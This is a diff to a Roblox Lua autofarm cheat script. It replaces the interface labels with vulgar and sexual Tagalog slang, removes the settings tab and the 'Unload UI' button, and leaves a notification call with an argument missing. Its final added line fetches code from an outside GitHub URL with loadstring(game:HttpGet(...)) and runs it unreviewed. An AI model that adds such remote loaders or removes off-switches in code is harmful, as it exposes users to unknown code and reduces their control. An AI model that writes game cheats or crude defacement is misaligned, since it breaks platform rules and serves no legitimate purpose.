@@ -201,24 +201,24 @@ local function runNpcFarm()
 end
 
 local FarmSection = Window:CreateSection({
-    Name = "NPC Farm",
+    Name = "lupaypay si zyrone",
     Icon = "rbxassetid://98092584632154"
 })
 
 local FarmTab = FarmSection:AddTab({
-    Name = "Autofarm",
-    Description = "Pivot above NPCs and fire the remote",
+    Name = "tite",
+    Description = "bayag",
     Icon = "rbxassetid://94219370057308"
 })
 
 local FarmGroup = FarmTab:AddGroup({
-    Name = "NPC Controls",
+    Name = "mga pepe",
     Side = "Left",
     Icon = "rbxassetid://10723427199"
 })
 
 npcDropdown = FarmGroup:AddDropdown({
-    Name = "NPC Child",
+    Name = "bata",
     Options = getNpcOptions(),
     Default = getNpcOptions()[1],
     Callback = function(value)
@@ -239,7 +239,7 @@ FarmGroup:AddButton({
 })
 
 FarmGroup:AddToggle({
-    Name = "Auto Farm",
+    Name = "maag jakol",
     Default = false,
     Callback = function(value)
         state.autoFarm = value
@@ -254,7 +254,7 @@ FarmGroup:AddToggle({
 })
 
 FarmGroup:AddToggle({
-    Name = "Auto Skill",
+    Name = "duket",
     Default = false,
     Callback = function(value)
         state.autoSkill = value
@@ -262,7 +262,7 @@ FarmGroup:AddToggle({
 })
 
 FarmGroup:AddToggle({
-    Name = "Auto Ultimate",
+    Name = "lumakas",
     Default = false,
     Callback = function(value)
         state.autoUltimate = value
@@ -270,7 +270,7 @@ FarmGroup:AddToggle({
 })
 
 FarmGroup:AddButton({
-    Name = "Run Once",
+    Name = "tumakbo",
     Callback = function()
         local ok, err = pcall(runNpcFarm)
         if not ok then
@@ -280,25 +280,18 @@ FarmGroup:AddButton({
 })
 
 FarmGroup:AddLabel({
-    Text = "Dropdown order follows workspace.NPCs:GetChildren()."
+    Text = "looking for kantutan siogo location"
+})
+FarmGroup:AddLabel({
+    Text = "gumawa po neto is tarantado"
+})
+FarmGroup:AddLabel({
+    Text = "kawawa po si hev abi nakulong aray ko"
+})
+FarmGroup:AddLabel({
+    Text = "sana bumalik yung presyo ng gas, galit napo si jian"
 })
 
-local SettingsSection = Window:CreateSection({
-    Name = "Window",
-    Icon = "rbxassetid://98092584632154"
-})
-
-local SettingsTab = SettingsSection:AddTab({
-    Name = "Settings",
-    Description = "Unload and control this script",
-    Icon = "rbxassetid://94219370057308"
-})
-
-local SettingsGroup = SettingsTab:AddGroup({
-    Name = "Controls",
-    Side = "Left",
-    Icon = "rbxassetid://14540833263"
-})
 
 local function stopFlowNpcFarm(deleteWindow)
     state.running = false
@@ -312,13 +305,6 @@ local function stopFlowNpcFarm(deleteWindow)
 
     _G.FlowNPCFarm = nil
 end
-
-SettingsGroup:AddButton({
-    Name = "Unload UI",
-    Callback = function()
-        stopFlowNpcFarm(true)
-    end
-})
 
 _G.FlowNPCFarm = {
     Stop = stopFlowNpcFarm
@@ -340,4 +326,5 @@ task.spawn(function()
     end
 end)
 
-notifyFlow("Flow NPC Farm", "Standalone NPC autofarm loaded.", 4)
+notifyFlow("ready napo kumantot lets go!", 4)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
